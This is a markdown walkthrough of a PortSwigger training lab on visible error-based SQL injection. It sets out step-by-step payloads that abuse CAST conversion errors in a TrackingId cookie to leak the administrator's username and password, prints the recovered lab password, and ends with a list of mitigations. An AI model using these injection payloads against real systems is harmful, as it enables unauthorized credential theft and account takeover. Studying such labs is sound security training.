# 📘 PortSwigger Lab 011: Visible Error-Based SQL Injection

<a id="top"></a>

> 🔗 Lab: https://portswigger.net/web-security/sql-injection/blind/lab-sql-injection-visible-error-based

---

# 📑 Contents

- [📘 PortSwigger Lab 011: Visible Error-Based SQL Injection](#-portswigger-lab-011-visible-error-based-sql-injection)
- [📑 Contents](#-contents)
- [🎯 Goal](#-goal)
- [🧠 Theory](#-theory)
- [🔍 Step 1 — Confirm SQL Injection](#-step-1--confirm-sql-injection)
- [🔍 Step 2 — Fix Query Syntax](#-step-2--fix-query-syntax)
- [🔍 Step 3 — Verify Subquery Execution](#-step-3--verify-subquery-execution)
- [🔍 Step 4 — Extract Username](#-step-4--extract-username)
- [🔍 Step 5 — Extract Password](#-step-5--extract-password)
- [🔍 Step 6 — Login as administrator](#-step-6--login-as-administrator)
- [🧩 Payloads Used](#-payloads-used)
- [💥 Why the Attack Worked](#-why-the-attack-worked)
- [🛡 Mitigation](#-mitigation)
- [🛠 Checklist](#-checklist)
- [⬆ Back to Top](#-back-to-top)

---

<a id="goal"></a>
# 🎯 Goal

Retrieve the administrator password using verbose SQL errors and log in.

---

<a id="theory"></a>
# 🧠 Theory

Unlike blind SQL injection, where data must be extracted character by character, this lab exposes detailed database error messages.

By forcing a type conversion error, the database discloses sensitive values directly inside the error response.

---

<a id="step1"></a>
# 🔍 Step 1 — Confirm SQL Injection

```sql
TrackingId=value'
```

The application returns:

```text
Unterminated string literal
```

This confirms SQL injection.

---

<a id="step2"></a>
# 🔍 Step 2 — Fix Query Syntax

```sql
TrackingId=value'--
```

The error disappears.

---

<a id="step3"></a>
# 🔍 Step 3 — Verify Subquery Execution

```sql
TrackingId=' AND 1=CAST((SELECT 1) AS int)--
```

The query executes successfully.

---

<a id="step4"></a>
# 🔍 Step 4 — Extract Username

```sql
TrackingId=' AND 1=CAST((SELECT username FROM users LIMIT 1) AS int)--
```

The response contains:

```text
administrator
```

---

<a id="step5"></a>
# 🔍 Step 5 — Extract Password

```sql
TrackingId=' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--
```

<details>
<summary>🔑 Show administrator password</summary>

Username: administrator

Password: fbyqtqoo62b7fhko4ugj

</details>

---

<a id="step6"></a>
# 🔍 Step 6 — Login as administrator

Authenticate using the recovered credentials.

---

<a id="payloads"></a>
# 🧩 Payloads Used

```sql
'
```

```sql
'--
```

```sql
' AND 1=CAST((SELECT 1) AS int)--
```

```sql
' AND 1=CAST((SELECT username FROM users LIMIT 1) AS int)--
```

```sql
' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--
```

---

<a id="why"></a>
# 💥 Why the Attack Worked

- TrackingId was inserted directly into SQL.
- Verbose database errors were enabled.
- CAST generated type conversion errors.
- Sensitive values were reflected in error messages.

---

<a id="defense"></a>
# 🛡 Mitigation

- Prepared Statements
- Parameterized Queries
- Disable verbose database errors
- Least Privilege
- WAF
- SQL error monitoring

---

<a id="checklist"></a>
# 🛠 Checklist

- [x] SQL Injection confirmed
- [x] Subquery execution confirmed
- [x] Username extracted
- [x] Password extracted
- [x] Logged in as administrator

---

# ⬆ Back to Top

[Back to Contents](#top)
